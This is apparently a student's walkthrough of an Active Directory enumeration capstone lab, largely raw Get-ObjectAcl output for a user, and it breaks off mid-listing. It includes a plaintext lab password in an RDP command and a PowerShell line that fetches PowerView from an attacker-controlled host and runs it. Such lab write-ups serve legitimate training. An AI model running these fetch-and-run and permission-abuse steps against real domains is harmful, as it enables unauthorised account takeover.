# Walk: Active Directory Enumeration - Capstone - VM Group 2 

## Fecha: 01/07/2025
## Host: Windows 
## IP: 192.168.xxx.70-76
## Objetivo
Capstone Exercise: Start VM Group 2 and log in as stephanie to CLIENT75. 
From CLIENT75, enumerate the object permissions for the domain users. 
Once weak permissions have been identified, use them to take full control over the account and use it to log in to the domain. 
Once logged in, repeat the enumeration process using techniques shown in this Module to obtain the flag.
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Login y Enumeracion:

* Kali

```bash
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# xfreerdp /u:"stephanie" /p:'LegmanTeamBenzoin!!' /v:192.168.234.75 /dynamic-resolut
```

* powershell

```powershell
PS C:\Users\stephanie> iwr -uri http://192.168.45.213:8000/PowerView.ps1 -Outfile pv.ps1
PS C:\Users\stephanie> . .\pv.ps1
PS C:\Users\stephanie> Get-ObjectAcl -SamAccountName stephanie -ResolveGUIDs


AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Account-Restrictions
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Logon
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Membership
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : RAS-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : X509-Cert
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-517
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Token-Groups-Global-And-Universal
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-560
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Terminal-Server
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-561
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Terminal-Server-License-Server
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-561
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Change-Password
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-1-0
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Change-Password
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : Send-As
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : Receive-As
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : General-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-11
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Public-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-11
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Personal-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-11
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Web-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-11
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Personal-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Email-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Web-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1987370270-658905905-1781884369-512
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 24
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-548
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : ReadControl
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-11
AccessMask            : 131072
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericRead
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-10
AccessMask            : 131220
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-18
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Account-Restrictions
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Account-Restrictions
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Logon
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Logon
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Membership
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Membership
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : General-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : General-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : RAS-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : RAS-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : ms-DS-Key-Credential-Link
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-526
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : ms-DS-Key-Credential-Link
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-527
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : Self
ObjectAceType          : DS-Validated-Write-Computer
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-3-0
AccessMask             : 8
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : Self
ObjectAceType          : DS-Validated-Write-Computer
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-10
AccessMask             : 8
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Token-Groups
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-9
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Token-Groups
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-9
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Group
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Token-Groups
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-9
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : ms-TPM-Tpm-Information-For-Computer
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-10
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : GenericRead
ObjectAceType          : All
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 131220
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : GenericRead
ObjectAceType          : All
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 131220
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Group
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : GenericRead
ObjectAceType          : All
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 131220
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit, ObjectInherit
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ObjectInherit, ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty, ExtendedRight
ObjectAceType          : Private-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 304
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : True
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1987370270-658905905-1781884369-519
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : ListChildren
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : ContainerInherit
BinaryLength          : 24
IsInherited           : True
